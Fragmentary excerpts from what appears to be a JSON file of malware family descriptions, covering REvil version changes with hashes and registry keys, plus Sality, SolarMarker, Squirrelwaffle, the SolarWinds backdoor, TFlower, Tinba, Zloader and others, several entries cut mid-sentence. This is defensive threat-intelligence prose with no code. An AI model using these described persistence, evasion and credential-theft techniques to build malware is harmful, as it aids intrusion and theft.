Data for value is set to the full path and filename of the currently running executable. The executable is never moved into any 'working directory' such as %AppData% or %TEMP% as part of the persistence setup. The Reg Value used is the hardcoded value of 'lNOWZyAWVv' :\r\n  * SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\lNOWZyAWVv\r\n* Before exiting, REvil sets up its malicious executable to be deleted upon reboot by issuing a call to MoveFileExW and setting the destination to NULL and the flags to 4 (MOVEFILE_DELAY_UNTIL_REBOOT). This breaks persistence however as the target executable specified in the Run key will no longer exist once this is done.\r\n* Changes registry key values from --> to:\r\n  * QPM --> tgE\r\n  * cMtS --> 8K09\r\n  * WGg7j --> xMtNc\r\n  * zbhs8h --> CTgE4a\r\n  * H85TP10 --> oE5bZg0\r\n  * GCZg2PXD --> DC408Qp4\r\n------------------------------------\r\nREvil v1.06\r\nMD5: 65ff37973426c09b9ff95f354e62959e\r\nSHA1: b53bc09cfbd292af7b3609734a99d101bd24d77e\r\nSHA256: 0e37d9d0a7441a98119eb1361a0605042c4db0e8369b54ba26e6ba08d9b62f1e\r\n* Updated string decoding function to break existing yara rules. Likely the result of the blog posted by us.\r\n* Modified handling of network file encryption. Now explicitly passes every possible \"Scope\" constant to the WNetOpenEnum function when looking for files to encrypt. It also changed the 'Resource Type\" from RESOURCETYPE_DISK to RESOURCETYPE_ANY which will now include things like mapped printers.\r\n* Persistence registry value changed from 'lNOWZyAWVv' to 'sNpEShi30R'\r\n* Changes registry key values from --> to:\r\n  * tgE --> 73g\r\n  * 8K09 --> vTGj\r\n  * xMtNc --> Q7PZe\r\n  * CTgE4a --> BuCrIp\r\n  * oE5bZg0 --> lcZd7OY\r\n  * DC408Qp4 --> sLF86MWC\r\n------------------------------------\r\nREvil v1.07\r\nMD5: ea4cae3d6d8150215a4d90593a4c30f2\r\nSHA1: 8dcbcbefaedf5675b170af3fd44db93ad864894e\r\nSHA256: 6a2bd52a5d68a7250d1de481dcce91a32f54824c1c540f0a040d05f757220cd3\r\nTBD",

      "description": "F-Secure states that the Sality virus family has been circulating in the wild as early as 2003. Over the years, the malware has been developed and improved with the addition of new features, such as rootkit or backdoor functionality, and so on, keeping it an active and relevant threat despite the relative age of the malware.\r\n\r\nModern Sality variants also have the ability to communicate over a peer-to-peer (P2P) network, allowing an attacker to control a botnet of Sality-infected machines. The combined resources of the Sality botnet may also be used by its controller(s) to perform other malicious actions, such as attacking routers.\r\n\r\nInfection\r\nSality viruses typically infect executable files on local, shared and removable drives. In earlier variants, the Sality virus simply added its own malicious code to the end of the infected (or host) file, a technique known as prepending. The viral code that Sality inserts is polymorphic, a form of complex code that is intended to make analysis more difficult.\r\n\r\nEarlier Sality variants were regarded as technically sophisticated in that they use an Entry Point Obscuration (EPO) technique to hide their presence on the system. This technique means that the virus inserts a command somewhere in the middle of an infected file's code, so that when the system is reading the file to execute it and comes to the command, it forces the system to 'jump' to the malware's code and execute that instead. This technique was used to make discovery and disinfection of the malicious code harder.\r\n\r\nPayload\r\nOnce installed on the computer system, Sality viruses usually also execute a malicious payload. The specific actions performed depend on the specific variant in question, but generally Sality viruses will attempt to terminate processes, particularly those related to security programs. The virus may also attempt to open connections to remote sites, download and run additional malicious files, and steal data from the infected machine.",

Once ServHelper establishes remote desktop access, the malware contains functionality for the threat actor to 'hijack' legitimate user accounts or their web browser profiles and use them as they see fit. The 'downloader' variant is stripped of the tunneling and hijacking functionality and is used as a basic downloader.\"\r\n",

Besides capabilities typical for infostealers, SolarMarker has additional capabilities such as file transfer and execution of commands received from a C2 server.\r\n\r\nThe malware invests significant effort into defense evasion, which consists of techniques like signed files, huge files, impersonation of legitimate software installations and obfuscated PowerShell scripts.",

It provides attackers with an initial foothold in a victim’s environment and a channel to deliver and infect systems with other malware. When a recipient opens a Squirrelwaffle-infected document and enables macros, a visual basic script typically downloads and executes malicious files and scripts, giving further control of the computer to an attacker. Squirrelwaffle operators also use DocuSign to try and trick the user into enabling macros in Office documents.",

After an initial dormant period of up to two weeks, it uses a DGA to generate specific subdomains for a set C&C domain. The backdoor retrieves and executes commands, that include the ability to transfer files, execute files, profile the system, reboot the machine, and disable system services. The C2 traffic to the malicious domains is designed to mimic normal SolarWinds API communications: Orion Improvement Program (OIP) protocol. The backdoor uses multiple obfuscated blocklists to identify forensic and anti-virus tools running as processes, services, and drivers. Multiple trojanzied updates were digitally signed from March - May 2020 and posted to the SolarWinds updates website.",

Next it checks that HKU\\SOFTWARE\\Microsoft\\CTF exists, decodes an embedded payload using a custom rolling XOR algorithm and manually loads into memory an embedded payload using a custom PE-like file format. TEARDROP does not have code overlap with any previously seen malware. FireEye believe that this was used to execute a customized Cobalt Strike BEACON.",

      "description": "TFlower is a new ransomware targeting mostly corporate networks discovered in August, 2019. It is reportedly installed on networks by attackers after they gain access via RDP. TFlower displays a console showing activity being performed by the ransomware when it encrypts a machine, further indicating that this ransomware is triggered by the attacker post compromise, similar to Samsam/Samas in terms of TTP. Once encryption is started, the ransomware will conduct a status report to an apparently hard-coded C2. Shadow copies are deleted and the Windows 10 repair environment is disabled by this ransomware. This malware also will terminate any running Outlook.exe process so that the mail files can be encrypted. This ransomware does not add an extention to encrypted files, but prepends the marker \"*tflower\" and what may be the encrypted encryption key for the file to each affected file. Once encryption is completed, another status report is sent to the C2 server.",

The third stage payload was created via the second stage payload, is interactively executed in the operation and exists in both x64 and x86 versions. Most of them use Internet Explorer or Google Chrome icons and corresponding file names to disguise themselves as legitimate internet browsers. The malware decrypts the embedded payload at runtime. It uses an embedded 16-byte XOR key to decrypt the base64 encoded payload. The decrypted payload is another portable executable file that runs in memory. Before getting decrypted with a hardcoded XOR key, the backdoor also checks for sandbox environment.\r\nThe backdoor has some code overlap with a know malware family PEBBLEDASH, attributed to Lazarus/LABYRINTH CHOLLIMA.",

According to news reports, Tinba has been found targeting bank customers in the United States and Europe.\r\n\r\nIf Tinba successfully infects a device, it can steal banking and personal information through webinjects. To do this, the malware monitors the user's browser activity and if specific banking portals are visited, Tinba injects code to present the victim with fake web forms designed to mimic the legitimate web site. The malware then tricks them into entering their personal information, log-in credentials, etc in the legitimate-looking page.\r\n\r\nTinba may also display socially-engineered messages to lure or pressure the user into entering their information on the fake page; for example, a message may be shown which attempts to convince the victim that funds were accidentally deposited to his account and must be refunded immediately.",

The program's author claimed the malware was written from scratch, but that it functioned similarly to the ZeuS banking trojan in that it could steal passwords and inject arbitrary content when victims visited banking Web sites. However, he then proceeded to destroy his own reputation on hacker forums by promoting his development too aggressively. As a displacement activity, he published his source code on Github.

This is implemented through a couple dozen C++ classes such as CMFile, CMFile, CMProcess, TFileDownload, TDrive, TProcessInfo, TSock, etc. The first stage custom installer utilizes the same classes. The Trojan uses HTTP Server API to filter HTTPS packets at port 443 and parse commands. \r\nIt is also used by attackers to gather a target’s data, make lateral movements and create SOCKS tunnels to their C2 using the Earthworm tunneler.Given that the Trojan is an HTTPS server itself, the SOCKS tunnel is used for targets without an external IP, so the C2 is able to send commands.",

On examination, this crypter turned out to be very basic and was used also by other malware families such as: Netwalker, Gozi ISFB v3, ZLoader and Smokeloader. The crypter mainly contains junk code to increase entropy of the sample and hide the actual code.",

It also communicates with its C&C server, sending environment information such as installed AV and other applications.

      "description": "This family describes the (initially small) loader, which downloads Zeus OpenSSL.\r\n\r\nIn June 2016, a new loader was dubbed DEloader by Fortinet. It has some functions borrowed from Zeus 2.0.8.9 (e.g. the versioning, nrv2b, binstorage-labels), but more importantly, it downloaded a Zeus-like banking trojan (-> Zeus OpenSSL). Furthermore, the loader shared its versioning with the Zeus OpenSSL it downloaded.\r\nThe initial samples from May 2016 were small (17920 bytes). At some point, visualEncrypt/Decrypt was added, e.g. in v1.11.0.0 (September 2016) with size 27648 bytes. In January 2017 with v1.15.0.0, obfuscation was added, which blew the size up to roughly 80k, and the loader became known as Zloader aka Terdot. These changes may be related to the Moskalvzapoe Distribution Network, which started the distribution of it at the same time.\r\n\r\nPlease note that IBM X-Force decided to call win.zloader/win.zeus_openssl \"Zeus Sphinx\", after mentioning it as \"a new version of Zeus Sphinx\" in their initial post in August 2016. Malpedia thus lists the alias \"Zeus XSphinx\" for win.zeus_openssl - the X to refer to IBM X-Force.",
